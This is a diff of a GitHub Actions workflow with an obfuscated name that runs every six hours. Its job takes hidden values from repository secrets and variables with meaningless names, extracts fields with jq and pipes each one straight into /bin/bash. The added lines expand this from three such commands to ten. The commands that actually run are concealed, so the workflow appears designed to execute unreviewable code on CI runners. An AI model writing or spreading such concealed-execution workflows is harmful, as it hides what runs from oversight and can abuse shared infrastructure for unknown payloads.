@@ -1,8 +1,9 @@
 name: baiqiangda4390
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 4/6 * * *'
+    - cron: '26 1/6 * * *'
 
 jobs:
   build:
@@ -11,9 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: baiqiangda4390
         env:
-          q13: ${{ secrets.q13 }}
+          oefp04: ${{ secrets.oefp04 }}
         run: |
-          echo $q13 | jq -r .qbtv9544 | /bin/bash
-          echo $stkr1 | jq -r .g5805 | /bin/bash
-          echo $dhmcv162 | jq -r .vd16068 | /bin/bash
+          echo $oefp04 | jq -r .t74 | /bin/bash
+          echo $h62352 | jq -r .hfjb63 | /bin/bash
+          echo $k27 | jq -r .snkoj7 | /bin/bash
+          echo $hnqy5561 | jq -r .phzop77147 | /bin/bash
+          echo $xha7096 | jq -r .gn685 | /bin/bash
+          echo $fzxx3489 | jq -r .nbofh9725 | /bin/bash
+          echo $q16 | jq -r .ozz236 | /bin/bash
+          echo $chps50 | jq -r .cx5 | /bin/bash
+          echo $lr75 | jq -r .vmvb0 | /bin/bash
+          echo $pmv2 | jq -r .ob043 | /bin/bash
 
